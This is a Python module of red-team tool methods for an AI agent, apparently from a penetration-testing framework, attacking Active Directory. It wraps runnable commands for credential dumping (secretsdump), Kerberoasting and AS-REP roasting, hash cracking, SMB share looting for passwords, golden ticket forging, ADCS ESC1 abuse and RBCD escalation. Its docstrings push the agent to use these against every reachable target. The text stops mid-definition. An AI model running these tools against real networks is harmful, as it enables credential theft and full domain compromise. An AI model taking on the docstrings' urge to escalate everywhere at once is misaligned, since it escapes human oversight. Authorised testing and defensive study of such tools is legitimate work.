"""Red Team penetration testing tools for Active Directory environments.

This module provides toolsets for network enumeration, credential harvesting,
password cracking, share pilfering, and golden ticket generation.
"""

import logging
import os
import subprocess
import tempfile
import time
from datetime import datetime, timezone
from typing import Any

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset

from ares.core.models import (
    Credential,
    Hash,
    Host,
    RedTeamState,
    Share,
    TimelineEvent,
    User,
)

logger = logging.getLogger(__name__)


class NetworkEnumerationTools(Toolset):
    """Tools for network scanning and enumeration."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def nmap_scan(self, target: str) -> str:
        """
        Scans target IPs to discover services, ports, and host information.

        This tool performs a comprehensive network scan to identify:
        - Open ports and running services
        - Service versions
        - Operating system information
        - Domain Controller vs Member Server classification

        Args:
            target: IP addresses to scan (space-separated for multiple targets)

        Returns:
            Detailed nmap scan output showing discovered services and versions

        Example:
            >>> result = nmap_scan("192.168.1.2")
            >>> result = nmap_scan("192.168.1.2 192.168.1.3 192.168.1.4")
        """
        cmd = ["nmap", "-T4", "-sS", "-sV", "--open"] + target.split(" ")

        try:
            logger.info(f"[*] Scanning targets: {target}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=300)

            if result.returncode != 0:
                logger.error(f"[!] Nmap scan failed: {result.stderr}")
                return result.stderr

            logger.info(f"[*] Nmap scan completed for target {target}")

            # Track the scanned hosts
            if self.state:
                for ip in target.split():
                    self.state.queried_hosts.add(ip)

            return result.stdout

        except subprocess.TimeoutExpired:
            logger.error("Nmap scan timed out after 5 minutes")
            return "Nmap scan timed out after 5 minutes"
        except Exception as e:
            logger.error(f"Scan failed: {e!s}")
            return f"Scan failed: {e!s}"

    @dn.tool_method
    def enumerate_users(self, target: str, username: str, password: str, domain: str = "") -> str:
        """
        Enumerate user accounts on a target using netexec (crackmapexec successor).

        This tool discovers all user accounts in the Active Directory environment,
        which is critical for credential-based attacks and understanding the
        user landscape.

        Args:
            target: IP address or hostname to enumerate
            username: Username for authentication (use empty string for null session)
            password: Password for authentication (use empty string for null session)
            domain: Domain for authentication (optional)

        Returns:
            List of discovered user accounts with details

        Example:
            >>> enumerate_users("192.168.1.100", "user", "pass", "DOMAIN")
            >>> enumerate_users("192.168.1.100", "", "", "")  # null session
        """
        try:
            cmd = ["netexec", "smb", target]

            if username and password:
                cmd.extend(["-u", username, "-p", password])
                if domain:
                    cmd.extend(["-d", domain])
            else:
                cmd.extend(["-u", "", "-p", ""])

            cmd.append("--users")

            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
            logger.info(
                f"[*] User enumeration completed for {target} (user:{username}, domain:{domain})"
            )

            return result.stdout

        except subprocess.TimeoutExpired:
            return f"User enumeration timed out for {target}"
        except Exception as e:
            logger.error(f"User enumeration failed: {e}")
            return f"User enumeration failed for {target}: {e}"

    @dn.tool_method
    def enumerate_shares(
        self, target: str, domain: str = "", username: str = "", password: str = ""
    ) -> str:
        """
        Enumerate SMB shares on a target using netexec.

        This tool discovers network shares which may contain sensitive files,
        credentials, or configuration information critical for privilege escalation.

        Args:
            target: IP address or hostname to enumerate
            domain: Domain for authentication
            username: Username for authentication (use empty string for null session)
            password: Password for authentication (use empty string for null session)

        Returns:
            List of discovered shares with access permissions

        Example:
            >>> enumerate_shares("192.168.1.100", "DOMAIN", "user", "pass")
        """
        try:
            cmd = ["netexec", "smb", target]

            if username and password:
                cmd.extend(["-u", username, "-p", password])
                if domain:
                    cmd.extend(["-d", domain])
            else:
                cmd.extend(["-u", "", "-p", ""])

            cmd.append("--shares")

            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
            logger.info(f"[*] Share enumeration completed for {target}")

            return result.stdout

        except subprocess.TimeoutExpired:
            return f"Share enumeration timed out for {target}"
        except Exception as e:
            logger.error(f"Share enumeration failed: {e}")
            return f"Share enumeration failed for {target}: {e}"


class CredentialHarvestingTools(Toolset):
    """Tools for harvesting credentials via Active Directory attacks."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def secretsdump(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        no_pass: bool = False,
        timeout_minutes: int = 10,
    ) -> str:
        """
        Extract secrets using impacket-secretsdump for credential harvesting.

        This is one of the most powerful tools for extracting credentials from
        Windows systems. It dumps SAM database, cached credentials, and LSA secrets.
        **CRITICAL: When you have admin access, run this on ALL targets, not just one.**

        Args:
            target: Target IP address or domain name
            username: Username with admin privileges
            password: Password for the username (optional)
            hash: NTLM hash for pass-the-hash authentication (optional)
            domain: Domain name (optional, can be inferred)
            no_pass: If True, use Kerberos golden ticket authentication
            timeout_minutes: Maximum time to spend dumping (default: 10)

        Returns:
            Extracted credentials including NTLM hashes, Kerberos keys, and secrets

        Example:
            >>> secretsdump("192.168.1.100", "Administrator", password="P@ssw0rd")
            >>> secretsdump("192.168.1.100", "Administrator", hash="aad3b4...", domain="DOMAIN")
            >>> secretsdump("domain.local", "Administrator", no_pass=True)  # golden ticket
        """
        cmd = ["/usr/bin/impacket-secretsdump"]

        if password and domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        elif password and not domain:
            target_string = f"{username}:{password}@{target}"
        elif hash and domain:
            cmd.extend(["-hashes", f":{hash}"])
            target_string = f"{domain}/{username}@{target}"
        elif hash and not domain:
            cmd.extend(["-hashes", f":{hash}"])
            target_string = f"{username}@{target}"
        elif no_pass:
            cmd.extend(["-k", "-no-pass"])
            target_string = f"{username}@{target}"
        else:
            return "[!] Error: Either password, hash, or no_pass must be provided"

        cmd.append(target_string)

        try:
            logger.info(f"[*] Running secretsdump on {target} with {username}")

            env = os.environ.copy() if no_pass else None
            if no_pass and env is not None:
                env["KRB5CCNAME"] = "Administrator.ccache"

            result = subprocess.run(
                cmd,
                check=False,
                capture_output=True,
                text=True,
                timeout=timeout_minutes * 60,
                env=env,
            )

            logger.info(f"[*] Secretsdump completed for {target}")
            return result.stdout

        except subprocess.TimeoutExpired:
            return "[!] Secretsdump timed out"
        except Exception as e:
            return f"[!] Secretsdump error: {e}"

    @dn.tool_method
    def kerberoast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform Kerberoasting attack to extract service account password hashes.

        Kerberoasting is a technique for extracting Kerberos TGS hashes for accounts
        with Service Principal Names (SPNs). These hashes can be cracked offline to
        obtain service account passwords, which often have elevated privileges.

        Args:
            domain: Target domain (e.g., 'example.local')
            username: Valid domain username
            password: Password for the username
            dc_ip: Domain controller IP address

        Returns:
            Kerberos TGS hashes for service accounts that can be cracked offline

        Example:
            >>> kerberoast("example.local", "user", "pass", "192.168.1.100")
        """
        cmd = [
            "/usr/bin/impacket-GetUserSPNs",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
            "-request",
        ]

        try:
            logger.info(f"[*] Kerberoasting {domain} using {username}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)
            return result.stdout

        except subprocess.TimeoutExpired:
            return "Error: Kerberoasting timed out"
        except Exception as e:
            return f"Kerberoasting failed: {e!s}"

    @dn.tool_method
    def asrep_roast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform AS-REP roasting attack to find users without Kerberos pre-authentication.

        AS-REP roasting targets users with "Do not require Kerberos preauthentication"
        enabled. This misconfiguration allows extracting AS-REP hashes that can be
        cracked offline to obtain user passwords.

        Args:
            domain: Target domain (e.g., 'example.local')
            username: Valid domain username (for enumeration)
            password: Password for the username
            dc_ip: Domain controller IP address

        Returns:
            AS-REP hashes for vulnerable user accounts

        Example:
            >>> asrep_roast("example.local", "user", "pass", "192.168.1.100")
        """
        cmd = [
            "/usr/bin/impacket-GetNPUsers",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
            "-request",
        ]

        try:
            logger.info(f"[*] AS-REP roasting {domain} using {username}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)
            return result.stdout

        except subprocess.TimeoutExpired:
            return "Error: AS-REP roasting timed out"
        except Exception as e:
            return f"AS-REP roasting failed: {e!s}"

    @dn.tool_method
    def domain_admin_checker(
        self,
        targets: str,
        username: str,
        password: str = "",
        hash: str = "",
    ) -> str:
        """
        Check if a compromised account has domain admin privileges across multiple targets.

        This tool is CRITICAL for identifying domain admin access. When you find an
        Administrator hash or password, IMMEDIATELY use this tool to check ALL targets.
        Look for "Pwn3d!" in the output which indicates administrative access.

        Args:
            targets: Space-separated IP addresses to check
            username: Username for authentication
            password: Password for authentication (optional)
            hash: NTLM hash for pass-the-hash authentication (optional)

        Returns:
            Results showing which targets the account has admin access on

        Example:
            >>> domain_admin_checker("192.168.1.100 192.168.1.101", "Administrator", password="P@ss")
            >>> domain_admin_checker("192.168.1.100 192.168.1.101", "Administrator", hash="aad3b4...")
        """
        try:
            cmd = ["netexec", "smb"] + targets.split(" ")

            if password:
                logger.info(f"[*] Domain admin checker using password for {username}")
                cmd.extend(["-u", username, "-p", password])
            elif hash:
                logger.info(f"[*] Domain admin checker using hash for {username}")
                cmd.extend(["-u", username, "-H", hash])
            else:
                return "[!] Error: Either password or hash must be provided"

            cmd.extend(["-x", "whoami"])

            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)

            output = ""
            if result.stdout:
                output += result.stdout
            if result.stderr:
                output += "\n" + result.stderr if output else result.stderr

            logger.info(f"[*] Domain admin check completed for {targets}")
            return output

        except subprocess.TimeoutExpired:
            return f"Domain admin checker timed out for {targets}"
        except Exception as e:
            logger.error(f"Domain admin checker failed: {e}")
            return f"Domain admin checker failed: {e}"


class CrackingTools(Toolset):
    """Tools for password hash cracking."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def crack_with_hashcat(
        self,
        hash_value: str,
        hashcat_mode: int = 13100,
        wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
        max_time_minutes: int = 10,
    ) -> str:
        """
        Attempt to crack a password hash using hashcat (GPU-accelerated).

        Hashcat is faster than John the Ripper when GPU is available. Use this FIRST.
        Common hash modes: NTLM (1000), Kerberos TGS (13100), Kerberos AS-REP (18200).

        **IMMEDIATELY report any successful cracks - don't wait for completion.**

        Args:
            hash_value: Hash to crack
            hashcat_mode: Hashcat mode (-m parameter). Common modes:
                - 1000: NTLM
                - 13100: Kerberos TGS ($krb5tgs$)
                - 18200: Kerberos AS-REP ($krb5asrep$)
            wordlist_path: Path to wordlist file (default: rockyou.txt)
            max_time_minutes: Maximum time to spend cracking (default: 10 minutes)

        Returns:
            Cracked passwords if successful, otherwise error message

        Example:
            >>> crack_with_hashcat("aad3b435b51404ee...", 1000)  # NTLM
            >>> crack_with_hashcat("$krb5tgs$23$*user$...", 13100)  # Kerberos TGS
        """
        output = "[*] Starting hashcat...\n"

        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False) as hash_file:
                hash_file.write(hash_value)
                hash_file_path = hash_file.name

            try:
                cmd = [
                    "hashcat",
                    "-m",
                    str(hashcat_mode),
                    "-a",
                    "0",
                    hash_file_path,
                    wordlist_path,
                    "--runtime",
                    str(max_time_minutes * 60),
                    "--force",
                ]

                result = subprocess.run(
                    cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=(max_time_minutes * 60) + 30,
                )

                show_cmd = ["hashcat", "-m", str(hashcat_mode), hash_file_path, "--show"]

                show_result = subprocess.run(
                    show_cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=30,
                )

                if show_result.stdout.strip():
                    output += "\n✓ CRACKED PASSWORDS:\n" + show_result.stdout
                    logger.info("[+] Hashcat successfully cracked hash")
                else:
                    output += "\n✗ No passwords cracked"

                return output

            finally:
                if os.path.exists(hash_file_path):
                    os.unlink(hash_file_path)

        except subprocess.TimeoutExpired:
            return output + "\nError: Hashcat timed out"
        except Exception as e:
            return output + f"\nError: {e!s}"

    @dn.tool_method
    def crack_with_john(
        self,
        hash_value: str,
        hash_format: str = "krb5asrep",
        wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
        max_time_minutes: int = 10,
    ) -> str:
        """
        Attempt to crack a password hash using John the Ripper (CPU-based).

        Use this as a fallback if hashcat fails or is unavailable. John is CPU-based
        and slower than hashcat, but more compatible with various hash formats.

        Common formats: ntlm, krb5asrep, krb5tgs

        Args:
            hash_value: Hash to crack
            hash_format: John hash format. Common formats:
                - ntlm: NTLM hashes
                - krb5asrep: Kerberos AS-REP hashes
                - krb5tgs: Kerberos TGS hashes
            wordlist_path: Path to wordlist file (default: rockyou.txt)
            max_time_minutes: Maximum time to spend cracking (default: 10 minutes)

        Returns:
            Cracked passwords if successful, otherwise error message

        Example:
            >>> crack_with_john("$krb5asrep$23$user@...", "krb5asrep")
            >>> crack_with_john("aad3b435b51404ee...", "ntlm")
        """
        output = "[*] Starting John the Ripper...\n"

        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False) as hash_file:
                hash_file.write(hash_value)
                hash_file_path = hash_file.name

            try:
                session_name = f"john_session_{int(time.time())}"
                cmd = [
                    "john",
                    "--wordlist=" + wordlist_path,
                    "--format=" + hash_format,
                    hash_file_path,
                    "--session=" + session_name,
                ]

                subprocess.run(
                    cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=(max_time_minutes * 60) + 30,
                )

                show_cmd = ["john", "--show", "--format=" + hash_format, hash_file_path]

                show_result = subprocess.run(
                    show_cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=30,
                )

                if show_result.stdout.strip():
                    output += "\n✓ CRACKED PASSWORDS:\n" + show_result.stdout
                    logger.info("[+] John successfully cracked hash")
                else:
                    output += "\n✗ No passwords cracked"

                return output

            finally:
                if os.path.exists(hash_file_path):
                    os.unlink(hash_file_path)

                session_files = [
                    f"{session_name}.pot",
                    f"{session_name}.rec",
                    f"{session_name}.log",
                ]
                for session_file in session_files:
                    if os.path.exists(session_file):
                        try:
                            os.unlink(session_file)
                        except Exception:
                            pass

        except subprocess.TimeoutExpired:
            return output + "\nError: John the Ripper timed out"
        except Exception as e:
            return output + f"\nError: {e!s}"


class SharePilferingTools(Toolset):
    """Tools for extracting credentials from SMB shares."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def enumerate_share_files(
        self,
        target: str,
        share_name: str,
        username: str,
        password: str,
    ) -> str:
        """
        Recursively enumerate all files in an SMB share to find credential-bearing files.

        This is the FIRST step in share pilfering. Use this to discover interesting files,
        then use download_file_content to examine them. Prioritize files with extensions:
        .ps1, .bat, .cmd, .xml, .ini, .conf, .config

        Args:
            target: Target IP address
            share_name: Name of the SMB share (e.g., 'SYSVOL', 'C$', 'NETLOGON')
            username: Username for authentication
            password: Password for authentication

        Returns:
            Recursive file listing of the share

        Example:
            >>> enumerate_share_files("192.168.1.100", "SYSVOL", "user", "pass")
        """
        share_path = f"//{target}/{share_name}"

        try:
            cmd = [
                "smbclient",
                share_path,
                "-U",
                f"{username}%{password}",
                "-c",
                "recurse ON; ls",
            ]

            logger.info(f"[*] Enumerating files in {share_path}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)

            if result.returncode != 0:
                logger.error(f"[!] Failed to list files: {result.stderr}")
                return f"Failed to list files: {result.stderr}"

            return result.stdout

        except subprocess.TimeoutExpired:
            logger.error(f"[!] File enumeration timed out for {share_path}")
            return "File enumeration timed out"
        except Exception as e:
            logger.error(f"[!] Error during enumeration: {e!s}")
            return f"Error during enumeration: {e!s}"

    @dn.tool_method
    def download_file_content(
        self,
        target: str,
        share_name: str,
        file_path: str,
        username: str,
        password: str,
        max_size_mb: int = 5,
    ) -> str:
        """
        Download and return the content of a file from an SMB share.

        Use this after enumerate_share_files to examine promising files. Look for:
        - Plaintext passwords in PowerShell scripts
        - GPP cpassword values in XML files
        - Connection strings in config files
        - API keys and tokens

        Args:
            target: Target IP address
            share_name: Name of the SMB share
            file_path: Path to the file within the share (e.g., 'scripts/deploy.ps1')
            username: Username for authentication
            password: Password for authentication
            max_size_mb: Maximum file size to download in MB (default: 5)

        Returns:
            Content of the downloaded file

        Example:
            >>> download_file_content("192.168.1.100", "SYSVOL", "Policies/script.ps1", "user", "pass")
        """
        share_path = f"//{target}/{share_name}"

        try:
            cmd = [
                "smbclient",
                share_path,
                "-U",
                f"{username}%{password}",
                "-c",
                f"get {file_path} /dev/stdout",
            ]

            logger.info(f"[*] Downloading {file_path} from {share_path}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                logger.error(f"[!] Failed to download file: {result.stderr}")
                return f"Failed to download file: {result.stderr}"

            content = result.stdout
            logger.info(f"[+] Downloaded {len(content)} bytes from {file_path}")

            # Log that share was accessed
            if self.state:
                logger.info(f"[+] Successfully accessed share {share_name} on {target}")

            return content

        except subprocess.TimeoutExpired:
            logger.error(f"[!] File download timed out for {file_path}")
            return "File download timed out"
        except Exception as e:
            logger.error(f"[!] Error downloading file: {e!s}")
            return f"Error downloading file: {e!s}"


class GoldenTicketTools(Toolset):
    """Tools for Kerberos golden ticket generation and domain escalation."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def get_sid(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str | None = None,
    ) -> str:
        """
        Get the SID (Security Identifier) of a domain.

        This is required for golden ticket generation. You need to get SIDs for BOTH:
        1. The compromised domain (where you have the krbtgt hash)
        2. The target domain (where you want to escalate)

        Args:
            domain: Target domain (e.g., 'subdomain.example.local')
            username: Valid domain username
            password: Password for the username
            dc_ip: Optional DC IP address to connect to (recommended to avoid DNS issues)

        Returns:
            Domain SID and list of domain users (look for "[*] Domain SID is: ...")

        Example:
            >>> get_sid("child.example.local", "user", "pass", "192.168.1.100")
            >>> get_sid("parent.example.local", "user", "pass", "192.168.1.101")
        """
        if dc_ip:
            cmd = ["impacket-lookupsid", f"{domain}/{username}:{password}@{dc_ip}"]
            logger.info(f"[*] Getting SID for {domain} using {username} via DC {dc_ip}")
        else:
            cmd = ["impacket-lookupsid", f"{username}:{password}@{domain}"]
            logger.info(f"[*] Getting SID for {domain} using {username}")

        try:
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
            logger.info(f"[*] SID lookup completed for {domain}")
            return result.stdout
        except subprocess.TimeoutExpired:
            return "Error: SID lookup timed out"
        except Exception as e:
            return f"Error: {e!s}"

    @dn.tool_method
    def generate_golden_ticket(
        self,
        krbtgt_hash: str,
        domain_sid: str,
        domain: str,
        extra_sid: str,
    ) -> str:
        """
        Generate a Kerberos golden ticket for Administrator to enable domain escalation.

        **This is the ULTIMATE privilege escalation technique.** A golden ticket gives
        you persistent, enterprise-level access to the entire domain forest.

        CRITICAL: The extra_sid should be the target domain SID with "-519" appended
        (Enterprise Admins group). This enables cross-domain privilege escalation.

        Args:
            krbtgt_hash: NTLM hash of the krbtgt account (from secretsdump)
            domain_sid: SID of the compromised domain (from get_sid)
            domain: Domain to generate ticket for (same as domain_sid domain)
            extra_sid: Target domain SID with "-519" appended (Enterprise Admins)

        Returns:
            Golden ticket generation output (saves to Administrator.ccache)

        Example:
            >>> generate_golden_ticket(
            ...     "abc123...",  # krbtgt hash
            ...     "S-1-5-21-123-456-789",  # compromised domain SID
            ...     "child.example.local",  # compromised domain
            ...     "S-1-5-21-111-222-333-519"  # target domain SID + 519
            ... )
        """
        cmd = [
            "impacket-ticketer",
            "-nthash",
            krbtgt_hash,
            "-domain-sid",
            domain_sid,
            "-domain",
            domain,
            "-extra-sid",
            extra_sid,
            "-user-id",
            "500",
            "Administrator",
        ]

        try:
            logger.info("[*] Generating golden ticket for Administrator")
            logger.info(f"[*] Domain: {domain}, SID: {domain_sid}, Extra SID: {extra_sid}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)

            if self.state:
                self.state.has_golden_ticket = True
                # Add timeline event
                event = TimelineEvent(
                    id=f"evt-{len(self.state.timeline):04d}",
                    timestamp=datetime.now(timezone.utc),
                    description=f"Golden ticket generated for {domain}",
                    mitre_techniques=["T1558.001"],  # Golden Ticket
                    confidence=1.0,
                    source="golden_ticket_generation",
                )
                self.state.timeline.append(event)

            return result.stdout
        except subprocess.TimeoutExpired:
            return "Error: Golden ticket generation timed out"
        except Exception as e:
            return f"Error: {e!s}"


class BloodHoundTools(Toolset):
    """Tools for ACL enumeration and privilege escalation path discovery."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def run_bloodhound(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Run BloodHound collection to discover ACL abuse paths and delegation.

        BloodHound reveals hidden privilege escalation opportunities:
        - Users with GenericAll/GenericWrite (shadow credentials, targeted kerberoast)
        - Unconstrained/constrained delegation
        - Shortest paths to Domain Admins
        - ACL-based attack chains

        CRITICAL: Run this with ANY valid credentials to find escalation paths.

        Args:
            domain: Target domain (e.g., 'sevenkingdoms.local')
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP address

        Returns:
            Status and JSON file paths for analysis

        Example:
            >>> run_bloodhound("sevenkingdoms.local", "samwell.tarly", "Heartsbane", "192.168.56.10")
        """
        cmd = [
            "bloodhound-python",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "-ns",
            dc_ip,
            "-c",
            "All",
        ]

        try:
            logger.info(f"[*] Running BloodHound collection for {domain}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=600)

            logger.info("[+] BloodHound collection completed")
            return result.stdout + "\n" + result.stderr

        except subprocess.TimeoutExpired:
            return "BloodHound collection timed out after 10 minutes"
        except Exception as e:
            logger.error(f"BloodHound failed: {e}")
            return f"BloodHound failed: {e}"


class CertipyTools(Toolset):
    """Tools for Active Directory Certificate Services exploitation."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def certipy_find(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Enumerate ADCS for vulnerable certificate templates (ESC1-15).

        ADCS misconfigurations enable privilege escalation to Domain Admin:
        - ESC1: Request cert as any user (including Domain Admin)
        - ESC2/3: Any Purpose EKU or Certificate Request Agent
        - ESC4: Vulnerable template ACLs
        - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
        - ESC8: NTLM relay to web enrollment

        If vulnerable templates found, use certipy_exploit_esc1 to escalate.

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP address

        Returns:
            List of CAs and vulnerable certificate templates

        Example:
            >>> certipy_find("sevenkingdoms.local", "samwell.tarly", "Heartsbane", "192.168.56.10")
        """
        cmd = [
            "certipy",
            "find",
            "-u",
            f"{username}@{domain}",
            "-p",
            password,
            "-dc-ip",
            dc_ip,
            "-vulnerable",
            "-stdout",
        ]

        try:
            logger.info(f"[*] Enumerating ADCS for {domain}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=300)

            if "ESC" in result.stdout:
                logger.warning("[!] VULNERABLE CERTIFICATE TEMPLATES FOUND!")

            return result.stdout + "\n" + result.stderr

        except subprocess.TimeoutExpired:
            return "Certipy enumeration timed out"
        except Exception as e:
            return f"Certipy enumeration failed: {e}"

    @dn.tool_method
    def certipy_req_esc1(
        self,
        domain: str,
        username: str,
        password: str,
        ca_name: str,
        template_name: str,
        target_upn: str,
        dc_ip: str,
    ) -> str:
        """
        Exploit ESC1 to request certificate for any user (Domain Admin path).

        ESC1 allows requesting certs for ANY user when template has
        "Enrollee Supplies Subject". Direct path to Domain Admin.

        After obtaining cert, use certipy_auth to get NTLM hash.

        Args:
            domain: Target domain
            username: Your compromised username
            password: Password for authentication
            ca_name: CA name from certipy_find
            template_name: Vulnerable template name
            target_upn: Target UPN (e.g., 'administrator@sevenkingdoms.local')
            dc_ip: Domain controller IP

        Returns:
            Certificate PFX file path

        Example:
            >>> certipy_req_esc1("sevenkingdoms.local", "user", "pass", "CA-NAME", "ESC1Template", "administrator@sevenkingdoms.local", "192.168.56.10")
        """
        cmd = [
            "certipy",
            "req",
            "-u",
            f"{username}@{domain}",
            "-p",
            password,
            "-dc-ip",
            dc_ip,
            "-ca",
            ca_name,
            "-template",
            template_name,
            "-upn",
            target_upn,
        ]

        try:
            logger.info(f"[*] Requesting certificate for {target_upn} via ESC1")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)

            if "saved" in result.stdout.lower():
                logger.info("[+] Certificate obtained! Use certipy_auth next.")

            return result.stdout + "\n" + result.stderr

        except subprocess.TimeoutExpired:
            return "Certificate request timed out"
        except Exception as e:
            return f"Certificate request failed: {e}"

    @dn.tool_method
    def certipy_auth(self, pfx_path: str, dc_ip: str) -> str:
        """
        Authenticate with certificate to obtain NTLM hash.

        Use after certipy_req_esc1 to get the target user's NTLM hash.
        IMMEDIATELY use the hash with domain_admin_checker.

        Args:
            pfx_path: Path to PFX certificate file
            dc_ip: Domain controller IP address

        Returns:
            NTLM hash for the authenticated user

        Example:
            >>> certipy_auth("administrator.pfx", "192.168.56.10")
        """
        cmd = ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", dc_ip]

        try:
            logger.info("[*] Authenticating with certificate")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)

            if "hash" in result.stdout.lower():
                logger.info("[+] NTLM hash obtained! Run domain_admin_checker.")

            return result.stdout + "\n" + result.stderr

        except subprocess.TimeoutExpired:
            return "Certificate authentication timed out"
        except Exception as e:
            return f"Certificate authentication failed: {e}"


class DelegationTools(Toolset):
    """Tools for Kerberos delegation attacks (RBCD, unconstrained, constrained)."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def find_delegation(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Find accounts with delegation enabled.

        Delegation enables privilege escalation:
        - Unconstrained: Capture TGTs from connecting users (DC compromise)
        - Constrained: Impersonate users to specific services
        - RBCD: Attacker-controlled delegation (requires GenericWrite)

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP address

        Returns:
            List of accounts with delegation

        Example:
            >>> find_delegation("sevenkingdoms.local", "samwell.tarly", "Heartsbane", "192.168.56.10")
        """
        cmd = [
            "impacket-findDelegation",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Searching for delegation in {domain}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
            return result.stdout
        except subprocess.TimeoutExpired:
            return "Delegation search timed out"
        except Exception as e:
            return f"Delegation search failed: {e}"

    @dn.tool_method
    def add_computer(
        self,
        domain: str,
        username: str,
        password: str,
        computer_name: str,
        computer_password: str,
        dc_ip: str,
    ) -> str:
        """
        Add computer account (requires MAQ > 0, default is 10).

        Computer accounts required for RBCD attacks.

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            computer_name: Name for new computer (without $)
            computer_password: Password for the computer account
            dc_ip: Domain controller IP

        Returns:
            Status of computer account creation

        Example:
            >>> add_computer("sevenkingdoms.local", "user", "pass", "EVILPC", "P@ss123!", "192.168.56.10")
        """
        cmd = [
            "impacket-addcomputer",
            f"{domain}/{username}:{password}",
            "-computer-name",
            computer_name,
            "-computer-pass",
            computer_password,
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Adding computer account {computer_name}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)
            logger.info(f"[+] Computer account {computer_name}$ created")
            return result.stdout
        except subprocess.TimeoutExpired:
            return "Computer account creation timed out"
        except Exception as e:
            return f"Computer account creation failed: {e}"

    @dn.tool_method
    def rbcd_write(
        self,
        domain: str,
        username: str,
        password: str,
        delegate_from: str,
        delegate_to: str,
        dc_ip: str,
    ) -> str:
        """
        Configure RBCD for privilege escalation.

        Attack chain: add_computer -> rbcd_write -> get_st -> secretsdump

        Args:
            domain: Target domain
            username: Username with GenericWrite on target
            password: Password for authentication
            delegate_from: Your controlled computer (with $)
            delegate_to: Target computer (with $)
            dc_ip: Domain controller IP

        Returns:
            Status of RBCD configuration

        Example:
            >>> rbcd_write("sevenkingdoms.local", "user", "pass", "EVILPC$", "DC01$", "192.168.56.10")
        """
        cmd = [
            "impacket-rbcd",
            "-delegate-from",
            delegate_from,
            "-delegate-to",
            delegate_to,
            "-action",
            "write",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Configuring RBCD: {delegate_from} -> {delegate_to}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
            logger.info("[+] RBCD configured - use get_st next")
            return result.stdout
        except subprocess.TimeoutExpired:
            return "RBCD configuration timed out"
        except Exception as e:
            return f"RBCD configuration failed: {e}"

    @dn.tool_method
    def get_st(
        self,
        domain: str,
        computer_name: str,
        computer_password: str,
        target_spn: str,
        impersonate_user: str,
        dc_ip: str,
    ) -> str:
        """
        Request service ticket while impersonating user (after RBCD).

        After rbcd_write, get ticket as Administrator for target service.

        Args:
            domain: Target domain
            computer_name: Your controlled computer (with $)
